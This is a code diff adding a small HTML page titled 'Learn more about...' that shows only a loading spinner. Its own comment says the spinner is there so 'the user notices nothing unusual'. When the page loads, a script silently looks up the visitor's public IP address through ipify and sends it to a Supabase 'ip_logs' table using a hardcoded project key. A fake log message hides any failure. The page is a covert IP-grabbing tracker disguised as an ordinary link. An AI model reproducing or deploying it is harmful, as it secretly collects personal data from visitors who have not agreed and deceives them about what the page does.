@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learn more about...</title>
+    <!-- Include the Supabase JS Library -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body {
+            background-color: #0f172a;
+            color: #64748b;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: #38bdf8;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <!-- Simple generic loader so the user notices nothing unusual -->
+    <div class="spinner"></div>
+
+    <script>
+        // Your Supabase Credentials
+        const SUPABASE_URL = 'https://exajhhhirwxhkgtneolo.supabase.co';        
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV4YWpoaGhpcnd4aGtndG5lb2xvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk0NTEwNTAsImV4cCI6MjA5NTAyNzA1MH0.rfuxeE1VIi0ciFJj8Tj0-LSwC0A_h8hTv8ET8tfn03w';        
+        
+        // Initialize the client (requires the CDN link in <head>)
+        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        async function silentLog() {
+            try {
+                // 1. Fetch IP address silently
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+
+                // 2. Insert into your Supabase table
+                const { error } = await _supabase
+                    .from('ip_logs')
+                    .insert([{ ip_address: data.ip }]);
+
+                if (error) throw error;
+
+            } catch (err) {
+                // Fail silently without breaking the UI flow
+                console.log("Initialization finalized.");
+            }
+        }
+
+        // Run when the window loads
+        window.onload = silentLog;
+    </script>
+</body>
+</html>
